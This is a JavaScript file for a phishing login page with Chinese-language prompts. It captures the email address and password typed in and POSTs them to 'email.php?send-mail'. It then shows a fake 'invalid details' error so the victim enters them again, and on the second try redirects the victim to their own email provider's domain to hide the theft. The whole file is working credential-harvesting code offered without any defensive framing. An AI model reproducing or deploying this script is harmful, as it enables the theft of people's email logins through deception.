var btnLogin = document.getElementById("login");

var email = document.getElementById("email");
var password = document.getElementById("password");
var error = document.querySelector("#error");

btnLogin.addEventListener('click', function(e){
	e.preventDefault();
	if(email.value === ""){
		error.textContent = "我们无法识别此电子邮件";
		email.style.borderColor = "red";
		email.focus();
		return false;
	}else if(password.value === ""){
		error.textContent = "请输入您的密码";
		password.style.borderColor = "red";
		password.focus();
		return false;
	} else {
		var processing = document.getElementById("processing");
		error.textContent = "登录中...";

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
	      	console.log(xmlhttp.responseText);
	      	var res = xmlhttp.responseText.replace(/\s+/g, "");
	      	if(xmlhttp.responseText === 'true'){
	      		error.textContent = "无效的详细信息";
	      	}else {
	      		error.textContent = xmlhttp.responseText;
				password.style.borderColor = "red";
	      	}
	      }
	    }

    	var formdata = new FormData();

    	formdata.append("email", email.value);
    	formdata.append("password", password.value);

	    var url = 'email.php?send-mail';

		var redirectUrl = email.value.split("@")[1];
		var counter = sessionStorage.getItem('counter');

		if(counter >= 1){
			window.location.href = 'https://'+redirectUrl;
		}else{
			sessionStorage.setItem('counter', counter+1);
		}
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return true;
	}
})